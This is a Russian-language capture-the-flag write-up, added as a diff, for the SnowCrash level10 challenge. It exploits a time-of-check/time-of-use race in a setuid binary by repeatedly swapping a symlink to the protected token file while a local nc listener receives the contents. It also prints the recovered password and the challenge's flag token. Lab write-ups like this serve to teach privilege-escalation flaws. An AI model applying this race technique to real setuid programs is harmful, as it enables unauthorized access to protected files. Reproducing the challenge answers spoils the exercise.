@@ -1,0 +1,61 @@
+В домашнем каталоге находится исполняемый файл и файл token:
+
+-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
+-rw-------  1 flag10  flag10     26 Mar  5  2016 token
+
+Исполняемый файл требует 2 аргумента имя файла и хост
+
+level10@SnowCrash:~$ ./level10 .profile 0.0.0.0
+Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
+
+
+В отдельном терминале запустить сервер:
+level10@SnowCrash:~$ nc -l 6969
+('Connected by', ('127.0.0.1', 52407))
+.*( )*.
+
+
+level10@SnowCrash:~$ ./level10 /tmp/.profile 0.0.0.0
+Connecting to 0.0.0.0:6969 .. Connected!
+Sending file .. wrote file!
+
+
+Если попробовать подать token:
+level10@SnowCrash:~$ ./level10 token 0.0.0.0
+You don't have access to token
+
+Cделаем символическую ссылку:
+
+level10@SnowCrash:~$ ln -s ~/token /tmp/link
+level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
+You don't have access to /tmp/link
+
+Будем в цикле подменять символическую ссылку:
+В отделном терминале запустить скрипт:
+
+echo > /tmp/hack && while :; do ln -fs /tmp/hack /tmp/fake; ln -fs ~/token /tmp/fake; done
+По сути, все, что мы здесь делаем, — это создаем символическую ссылку на файл, для которого у нас есть разрешения на чтение, а затем переключаем ее на token файл, который мы не можем прочитать. Все, что нам нужно сделать, это получить правильное время для исполняемого файла, чтобы увидеть, что у нас есть правильные разрешения, потому что он проверяет /tmp/fake файл, а затем открывает token файл, потому что символическая ссылка изменилась между двумя инструкциями.
+
+Запускаем nc в цикле:
+while :; do nc -l 6969; done
+
+Снова запускаем исполняемый файл (пока работают nc и скрипт оболочки) :
+
+level10@SnowCrash:~$ while :; do ./level10 /tmp/fake 0.0.0.0; done
+Connecting to 0.0.0.0:6969 .. Connected!
+Sending file .. wrote file!
+
+
+И nc выдает:
+
+level10@SnowCrash:~$ python /tmp/sever.py
+('Connected by', ('127.0.0.1', 52455))
+.*( )*.
+
+woupa2yuojeeaaed06riuj63c
+
+level10@SnowCrash:~$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
